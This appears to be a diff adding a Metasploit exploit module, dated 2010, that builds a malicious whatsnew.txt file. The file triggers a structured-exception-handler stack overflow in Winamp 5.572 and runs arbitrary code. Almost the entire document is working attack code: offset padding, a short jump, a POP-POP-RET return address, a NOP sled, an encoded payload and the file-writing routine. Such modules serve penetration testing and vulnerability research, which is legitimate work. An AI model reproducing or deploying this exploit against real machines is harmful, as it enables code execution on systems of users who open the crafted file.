@@ -1,0 +1,81 @@
+# Title: Winamp 5.572 whatsnew.txt SEH (MSF)
+# Author: Blake
+# Published: 2010-04-15
+# Tested on Windows XP SP3
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+    Rank = NormalRanking
+
+    include Msf::Exploit::FILEFORMAT
+   include Msf::Exploit::Remote::Seh
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name' => 'Winamp 5.572 whatsnew.txt Buffer Overflow Exploit (SEH)',
+            'Description' => %q{
+                This module exploits a stack overflow in Winamp version 5.572.
+            By creating a specially crafted whatsnew.txt file, an an attacker may be able
+            to execute arbitrary code. This exploit is triggered by accessing the help - winamp
+        - version history option once the whatsnew.txt file has been placed in the Winamp directory.
+            },
+            'License' => MSF_LICENSE,
+            'Author' => 'Blake',
+            'Version' => 'Version 1',
+            'References' =>
+                [
+                    [ 'OSVDB', '' ],
+                    [ 'URL', 'http://www.exploit-db.com/exploits/11267' ],
+                ],
+            'DefaultOptions' =>
+                {
+                    'EXITFUNC' => 'process',
+                },
+            'Payload' =>
+                {
+                    'Space' => 4488,
+                    'BadChars' => "\x00\x20\x0a\x0d",
+                    'StackAdjustment' => -3500,
+                    'DisableNops' => 'True',
+                },
+            'Platform' => 'win',
+            'Targets' =>
+                [
+                    [ 'Windows Universal', { 'Ret' => 0x10025497} ], #  pop ebx; pop ebp; retn gen_jumpex.dll
+
+                ],
+            'Privileged' => false,
+            'DefaultTarget' => 0))
+
+        register_options(
+            [
+                OptString.new('FILENAME', [ false, 'The file name.', 'whatsnew.txt']),
+            ], self.class)
+    end
+
+
+    def exploit
+
+    sploit = "Winamp 5.572"
+        sploit << rand_text_alphanumeric(672)
+        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
+        sploit << [target.ret].pack('V')
+        sploit << "\x90" * 20                    # nop sled
+        sploit << payload.encoded
+        sploit << rand_text_alphanumeric(4488 - payload.encoded.length)
+
+        whatsnewtxt = sploit
+        print_status("Creating '#{datastore['FILENAME']}' file ...")
+        file_create(whatsnewtxt)
+
+    end
+
+end
